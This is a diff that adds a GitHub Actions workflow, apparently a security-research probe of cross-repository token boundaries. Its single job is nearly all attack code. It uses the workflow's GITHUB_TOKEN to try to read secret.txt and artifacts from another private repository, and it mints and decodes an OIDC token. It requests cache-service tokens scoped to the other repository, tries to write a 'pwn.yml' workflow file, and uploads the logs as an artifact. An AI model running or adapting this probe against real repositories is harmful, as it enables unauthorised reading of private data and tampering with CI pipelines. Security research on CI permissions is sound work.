@@ -1,0 +1,74 @@
+name: xbound-conformance
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  actions: write
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: cross-boundary conformance probe
+        env:
+          GH: ${{ github.token }}
+          PRIV: lmacan1/bbt-tokenchain-1790760434
+          SELFREPO: ${{ github.repository }}
+        run: |
+          set +e
+          mkdir -p /tmp/r
+          exec > >(tee /tmp/r/log) 2>&1
+          echo "SELF=$SELFREPO RUN=$GITHUB_RUN_ID"
+          echo "TOKEN_PREFIX=${GH:0:4} len=${#GH}"
+          echo "x-oauth-scopes: $(curl -s -D - -o /dev/null -H "Authorization: Bearer $GH" https://api.github.com/rate_limit | grep -i x-oauth-scopes)"
+          echo
+          echo "== P1: this repo's GITHUB_TOKEN reading a DIFFERENT private repo =="
+          curl -s -o /tmp/r/p1 -w 'P1 HTTP=%{http_code}\n' -H "Authorization: Bearer $GH" \
+            https://api.github.com/repos/$PRIV/contents/secret.txt
+          head -c 300 /tmp/r/p1; echo
+          echo
+          echo "== P2: same, unauthenticated (control) =="
+          curl -s -o /tmp/r/p2 -w 'P2 HTTP=%{http_code}\n' https://api.github.com/repos/$PRIV/contents/secret.txt
+          head -c 200 /tmp/r/p2; echo
+          echo
+          echo "== P3: OIDC token, custom audience =="
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://xbound-probe.example/" \
+            | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
+          echo "oidc_len=${#TOK}"
+          if [ -n "$TOK" ]; then
+            p=$(echo "$TOK" | cut -d. -f2); p="$p$(echo "$TOK" | cut -d. -f3 | head -c 1)"
+            while [ $((${#p}%4)) -ne 0 ]; do p="${p}="; done
+            echo "$p" | tr '_-' '/+' | base64 -d 2>/dev/null | tee /tmp/r/oidc.json; echo
+            echo "--- oidc header (alg/kid) ---"
+            h=$(echo "$TOK" | cut -d. -f1); while [ $((${#h}%4)) -ne 0 ]; do h="${h}="; done
+            echo "$h" | tr '_-' '/+' | base64 -d 2>/dev/null; echo
+          fi
+          echo
+          echo "== P4: private repo artifact listing with cross-repo token =="
+          curl -s -o /tmp/r/p4 -w 'P4 HTTP=%{http_code}\n' -H "Authorization: Bearer $GH" \
+            https://api.github.com/repos/$PRIV/actions/artifacts
+          head -c 400 /tmp/r/p4; echo
+          echo
+          echo "== P5: actions cache service, scope for other repo =="
+          SC=$(printf '%s' "$PRIV" | base64 -w0)
+          curl -s -o /tmp/r/p5 -w 'P5 HTTP=%{http_code}\n' -H "Authorization: Bearer $GH" \
+            "https://artifactcache.actions.githubusercontent.com/token?service=results&scope=$SC"
+          head -c 300 /tmp/r/p5; echo
+          echo
+          echo "== P6: cache resolve a key that repo B may have written =="
+          curl -s -o /tmp/r/p6 -w 'P6 HTTP=%{http_code}\n' \
+            "https://artifactcache.actions.githubusercontent.com/cache?keys=xbound-probe"
+          head -c 200 /tmp/r/p6; echo
+          echo
+          echo "== P7: workflow-file edit authority of GITHUB_TOKEN =="
+          curl -s -o /tmp/r/p7 -w 'P7 HTTP=%{http_code}\n' -X PUT \
+            -H "Authorization: Bearer $GH" -H "Content-Type: application/json" \
+            -d '{"message":"xbound","content":"eA==","branch":"main"}' \
+            https://api.github.com/repos/$SELFREPO/contents/.github/workflows/pwn.yml
+          head -c 250 /tmp/r/p7; echo
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: xbound-log
+          path: /tmp/r
